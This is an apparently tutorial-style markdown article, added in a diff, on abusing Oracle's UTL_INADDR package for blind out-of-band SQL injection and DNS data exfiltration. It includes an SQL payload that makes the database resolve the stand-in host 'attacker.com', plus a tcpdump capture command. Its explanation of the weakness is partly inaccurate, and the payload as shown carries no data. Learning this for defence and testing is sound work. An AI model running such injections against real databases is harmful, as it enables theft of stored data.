@@ -1,0 +1,52 @@
+---
+title: Exploiting UTL_INADDR for DNS Data Exfiltration
+description: Learn to execute blind out-of-band SQL injection using Oracle's UTL_INADDR.
+keywords:
+- UTL_INADDR
+- Oracle SQL injection
+- DNS exfiltration
+- network address translation
+- blind SQL injection
+---
+
+# UTL_INADDR
+
+## Context
+
+This article aims to demonstrate how to leverage Oracle's UTL_INADDR package for executing blind out-of-band SQL injection attacks. The reader should possess a working understanding of SQL basics, HTTP requests, database functions, Oracle SQL injections, and specifically blind out-of-band injection techniques. The focus here is on exploiting the UTL_INADDR package to facilitate DNS-based data exfiltration.
+
+## Theory
+
+### UTL_INADDR Functionality in Oracle
+
+UTL_INADDR is an Oracle package primarily utilized for network address translation tasks. It is designed to enable the resolution of hostnames to IP addresses and vice versa within database environments. This functionality, while intentional, introduces a potential vulnerability. The package can be manipulated to perform DNS-based data exfiltration when leveraged in SQL injection attacks. This is achieved by crafting SQL payloads that force the database server to make DNS requests to an external server controlled by the attacker.
+
+### Blind Out-of-Band Injection via UTL_INADDR
+
+The attack sequence for exploiting this package involves injecting crafted SQL payloads that trigger DNS requests. These requests are directed to a malicious DNS server owned by the attacker. This method capitalizes on a protocol weakness in Oracle's DNS request handling, allowing for data exfiltration. The key vulnerability here is the lack of input validation, which enables arbitrary DNS queries, effectively exfiltrating information from the database without direct observation of the database responses.
+
+## Practice
+
+### Exploiting UTL_INADDR for DNS Exfiltration
+
+To exploit the UTL_INADDR package for DNS-based data exfiltration, follow these steps:
+
+- **Craft an SQL payload to trigger a DNS request.** The objective is to use the UTL_INADDR package to perform an outbound DNS request that reaches the attacker's DNS server. 
+   
+   ```sql
+   SELECT UTL_INADDR.get_host_address('attacker.com') FROM dual;
+   ```
+
+- **Monitor your DNS server for incoming requests.** Setting up a DNS server designed to capture queries allows you to listen for requests coming from the target database server. Capture DNS traffic using a network packet analyzer.
+
+   ```bash
+   tcpdump -i eth0 port 53
+   ```
+
+- **Analyze the DNS queries to extract exfiltrated data.** Once the database server sends DNS queries, analyze the captured packets to interpret the data. Information can be encoded in the DNS request, allowing an attacker to infer data from the database.
+
+By executing these steps, the database will connect to an outside server under an attacker's control, effectively permitting the attacker to exfiltrate data covertly through DNS queries.
+
+## Tools
+
+- **tcpdump**: This tool is essential for capturing and analyzing network packet traffic, particularly DNS queries made during the blind out-of-band injection process using UTL_INADDR.
